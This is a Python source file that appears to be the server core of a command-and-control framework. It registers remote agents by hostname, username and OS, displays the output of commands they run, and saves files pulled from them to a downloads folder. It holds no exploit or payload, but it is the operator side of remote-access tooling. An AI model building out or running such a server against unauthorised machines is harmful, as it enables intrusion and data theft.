# src/server/core/server.py

from .client_manager import Manager
from .client_session import ClientSession
from commands.interact.shell import ShellManager
from commands.agent.agent_commands import Exit
from config import start_print
from config import MessageType as messtype
from rich import print
from rich.markup import escape
import time
import subprocess
import os

class Server:

    def __init__(self, transport, serializer):

        self.__transport = transport
        self.__serializer = serializer
        self.__manager = Manager
        self.__shell = ShellManager


    def start(self):
        subprocess.run(["cls"] if os.name == 'nt' else ["clear"], shell=True)

        start_print()
        time.sleep(0.7)

        self.__transport.set_on_client(self.handle_client)
        self.__shell.set_exit_handler(self.stop)

        print(f'[bright_cyan][STARTING SERVER] ...[/bright_cyan]')
        time.sleep(0.7)
        try:
            self.__transport.start()
            print("[white]Type [blue_violet]'help'[/blue_violet] to get started.[/white]\n")
        except Exception as e:
            print(f"[bright_red][!] Something went wrong. Cannot start server\n Error: {e}[/bright_red]")
            return

        self.__shell.run()


    def handle_client(self, uuid, addr):
        session = ClientSession()
        session.set_transport(self.__transport)
        session.set_serializer(self.__serializer)
        session.set_cid(uuid)

        data = session.receive_response()
        if data is None:
            return

        if data['type'] == messtype.REGISTER:
            Server.handle_register(addr, data['data'], session)
            session.send_request(messtype.ACK, 'ACK')
            print(f'\n[bright_green][+] Successfully registered [bright_cyan]{addr[0]}[/bright_cyan][/bright_green]')
            try:
                from transport.api import broadcast_log, broadcast_client_update
                broadcast_log("success", f"Agent registered: {addr[0]}")
                broadcast_client_update()
            except Exception:
                pass

        else:
            result_data = data['data']

            # Check if this is a file download response (dict with file_data)
            if isinstance(result_data, dict) and result_data.get('status') == 'success' and 'file_data' in result_data:
                self.handle_file_download(uuid, addr, result_data)
            else:
                # Normal command result
                # Escape output để tránh rich markup parsing lỗi với HTML/special chars
                safe_output = escape(str(result_data))
                print(f"\n[bright_cyan]From {addr[0]}:[/bright_cyan]\n ---> {safe_output}")
                try:
                    from transport.api import broadcast_log
                    # broadcast_log nhận plain text, không cần escape
                    broadcast_log("result", f"[{addr[0]}] {result_data}")
                except Exception:
                    pass


    def handle_file_download(self, uuid, addr, download_data):
        """
        Handle saving a downloaded file from agent.

        Args:
            uuid: Agent UUID
            addr: Agent address tuple (ip, port)
            download_data: dict with file_data (base64), file_name, file_size, file_path
        """
        import base64

        try:
            file_name = download_data.get('file_name', 'downloaded_file')
            file_size = download_data.get('file_size', 0)
            remote_path = download_data.get('file_path', 'unknown')
            file_data_b64 = download_data.get('file_data')

            # Decode base64
            file_bytes = base64.b64decode(file_data_b64)

            # Create downloads directory: downloads/<uuid>/
            downloads_dir = os.path.join("downloads", uuid)
            os.makedirs(downloads_dir, exist_ok=True)

            local_save_path = os.path.join(downloads_dir, file_name)

            # Write file
            with open(local_save_path, 'wb') as f:
                f.write(file_bytes)
                f.flush()
                try:
                    os.fsync(f.fileno())
                except Exception:
                    pass

            actual_size = os.path.getsize(local_save_path)

            print(f"\n[bright_green][+] File downloaded from {addr[0]}:[/bright_green]")
            print(f"    Remote: [cyan]{remote_path}[/cyan]")
            print(f"    Saved:  [bright_yellow]{local_save_path}[/bright_yellow] ({actual_size} bytes)")

            # Broadcast to web dashboard
            try:
                from transport.api import broadcast_log
                broadcast_log("success", f"Downloaded {file_name} from {addr[0]} → {local_save_path} ({actual_size} bytes)")
            except Exception:
                pass

        except Exception as e:
            print(f"\n[bright_red][!] Failed to save downloaded file from {addr[0]}: {e}[/bright_red]")
            try:
                from transport.api import broadcast_log
                broadcast_log("error", f"Failed to save download from {addr[0]}: {e}")
            except Exception:
                pass

    def stop(self):
        while True:
            print("[bright_red][!] EXIT SERVER ? (y/n)[/bright_red]: ", end="")
            confirm = input().strip()

            if confirm.lower() == 'n':
                return 0
            elif confirm.lower() == 'y':
                print("[bright_red][*] Exiting server...[/bright_red]")
                time.sleep(0.5)
                try:

                    Exit.execute(*self.__shell.get_current_client())
                    self.__manager.drop_all_clients()
                    self.__transport.stop()
                    print(f"[bright_green][+] Successfully exited server[/bright_green]\n")
                    return 1
                except Exception as e:
                    print(f"[bright_red][!] Something went wrong.\n Error {e}[/bright_red]")
                    os._exit(1)
            else:
                print("[bright_red][!] Invalid option. Please try again [/bright_red]\n")
                time.sleep(0.5)
                continue


    @staticmethod
    def handle_register(addr, data, session):
        uuid        = data['uuid']
        hostname    = data['hostname']
        username    = data['username']
        address     = addr
        client_os   = f"{data['os']} {data['os_version']}"
        arch        = data['arch']

        Manager.add_client(uuid, hostname, username, address, client_os, arch, session)